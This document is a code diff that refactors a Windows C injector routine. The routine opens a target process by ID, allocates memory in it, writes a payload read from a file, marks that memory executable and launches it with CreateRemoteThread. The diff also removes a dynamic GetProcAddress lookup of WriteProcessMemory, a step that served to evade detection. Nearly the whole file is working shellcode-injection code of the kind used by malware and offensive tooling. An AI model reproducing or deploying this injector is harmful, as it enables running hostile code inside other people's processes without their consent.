@@ -1,6 +1,7 @@
 #include "crt.h"
-#include "mem.h"
+
 #include "logger.h"
+#include "mem.h"
 
 #ifndef VC_EXTRA_LEAN
 #define VC_EXTRA_LEAN
@@ -11,10 +12,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 
-typedef VOID (* exec_mem_t)(void);
-typedef WINBOOL (WINAPI * WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
-
-static char* ExtractBytesFromFile(const char* restrict f, size_t* size)
+__forceinline char* extract_bytes_from_file(const char* const restrict f, size_t* size)
 {
     FILE* fp = NULL;
 
@@ -32,9 +30,8 @@ static char* ExtractBytesFromFile(const char* restrict f, size_t* size)
     return bytesRead;
 }
 
-unsigned InjectExecuteShellcode(Resource* restrict resource, Injector* restrict injector)
+unsigned create_remote_thread(Resource* const restrict resource, Injector* const restrict injector)
 {
-    WriteProcessMemory_t    pWriteProcessMemory = NULL;
     exec_mem_t              exec_mem = NULL;
     HANDLE                  hProcess = NULL;
     HANDLE                  hThread = NULL;
@@ -43,57 +40,56 @@ unsigned InjectExecuteShellcode(Resource* restrict resource, Injector* restrict 
     char*                   payload = 0;
     size_t                  size = 0;
 
-    injector->logger && injector->logger(injector, "Opening target process..", 0);
+    LOG_MSG(injector, "Opening target process..", 0);
     if (!(hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, resource->process_id)))
     {
-        injector->logger && injector->logger(injector, "Failed to acquire handle to target", 0);
+        LOG_MSG(injector, "Failed to acquire handle to target", 0);
         CloseHandle(hProcess);
-        return -1u;
+        return 1;
     }
-    injector->logger && injector->logger(injector, "Process Handle to target acquired", 0);
+    LOG_MSG(injector, "Process Handle to target acquired", 0);
 
-    injector->logger && injector->logger(injector, "Allocating virtual memory to target..", 0);
-    if (!(exec_mem = (exec_mem_t)VirtualAllocEx(hProcess, NULL, size+1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
+    LOG_MSG(injector, "Allocating virtual memory to target..", 0);
+    payload = extract_bytes_from_file(resource->relative_payload_path, &size);
+    if (!(exec_mem = (exec_mem_t)VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
     {
-        injector->logger && injector->logger(injector, "Failed to allocate memory to target", 0);
+        printf("exec_mem: %p\n", exec_mem);
+        LOG_MSG(injector, "Failed to allocate memory to target", 0);
         CloseHandle(hProcess);
-        return -1u;
+        return 2;
     }
-    injector->logger && injector->logger(injector, "Allocation successful", 0);
+    LOG_MSG(injector, "Allocation successful", 0);
 
-    /*WriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size+1, NULL);*/
-    injector->logger && injector->logger(injector, "Writing payload to executable memory..", 0);
-    payload = ExtractBytesFromFile(resource->dll_rel_path, &size);
-    pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory");
-    if (!(pWriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size+1, NULL)))
+    LOG_MSG(injector, "Writing payload to executable memory..", 0);
+    if (!(WriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size, NULL)))
     {
         free(payload);
-        injector->logger && injector->logger(injector, "Failed to write payload to executable memory", 0);
-        return -1u;
+        LOG_MSG(injector, "Failed to write payload to executable memory", 0);
+        return 3;
     }
     free(payload);
-    injector->logger && injector->logger(injector, "Write success", 0);
+    LOG_MSG(injector, "Write success", 0);
 
-    injector->logger && injector->logger(injector, "Changing virtual protection permissions..", 0);
+    LOG_MSG(injector, "Changing virtual protection permissions..", 0);
     if (!(bSuccess = VirtualProtectEx(hProcess, (LPVOID)exec_mem, size, PAGE_EXECUTE_READ, &old_protect)))
     {
-        injector->logger && injector->logger(injector, "Failed to change virtual protection permissions", 0);
-        return -1u;
+        LOG_MSG(injector, "Failed to change virtual protection permissions", 0);
+        return 4;
     }
-    injector->logger && injector->logger(injector, "Protection changed", 0);
+    LOG_MSG(injector, "Protection changed", 0);
 
-    injector->logger && injector->logger(injector, "Creating remote thread..", 0);
+    LOG_MSG(injector, "Creating remote thread..", 0);
     if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL)))
     {
-        injector->logger && injector->logger(injector, "Failed to create remote thread", 0);
-        return -1u;
+        LOG_MSG(injector, "Failed to create remote thread", 0);
+        return 5;
     }
-    injector->logger && injector->logger(injector, "Remote thread created", 0);
+    LOG_MSG(injector, "Remote thread created", 0);
     
     // optional wait for object
     // WaitForSingleObject(hThread, INFINITE);
     
-    injector->logger && injector->logger(injector, "Closing handle and returning control to owner..", 0);
+    LOG_MSG(injector, "Closing handle and returning control to owner..", 0);
     CloseHandle(hProcess);
     return 0;
 }
